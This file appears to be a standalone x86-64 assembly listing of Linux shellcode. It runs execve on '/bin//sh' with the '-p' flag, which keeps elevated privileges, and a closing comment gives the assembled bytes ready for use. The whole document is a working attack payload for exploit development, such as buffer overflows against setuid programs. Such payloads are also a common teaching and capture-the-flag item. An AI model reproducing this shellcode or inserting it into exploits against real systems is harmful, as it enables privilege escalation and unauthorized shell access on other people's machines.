global _start

_start:
    ; execve("/bin/sh", NULL, NULL);
    push 0x3b                   ; execve()
    pop rax                     ; $rax = execve()

    cdq                         ; $rdx = NULL
    push rdx                    ; "\x00"

    mov rdi, 0x68732f2f6e69622f ; "/bin//sh"
    push rdi                    ; "/bin//sh\x00"
    push rsp                    ; "/bin/sh\x00"
    pop rdi                     ; $rdi = "/bin//sh"

    push rdx                    ; "\x00"
    push word 0x702d            ; "-p"
    push rsp                    ; "-p\x00"
    pop rsi                     ; $rsi = "-p"

    push rdx                    ; "\x00"
    push rsi                    ; "-p"
    push rdi                    ; "/bin//sh"

    push rsp                    ; ["/bin//sh", "-p"]
    pop rsi                     ; $rsi = ["/bin//sh", "-p"]

    syscall                     ; syscall

; shellcode = b"\x6a\x3b\x58\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x52\x66\x68\x2d\x70\x54\x5e\x52\x56\x57\x54\x5e\x0f\x05"
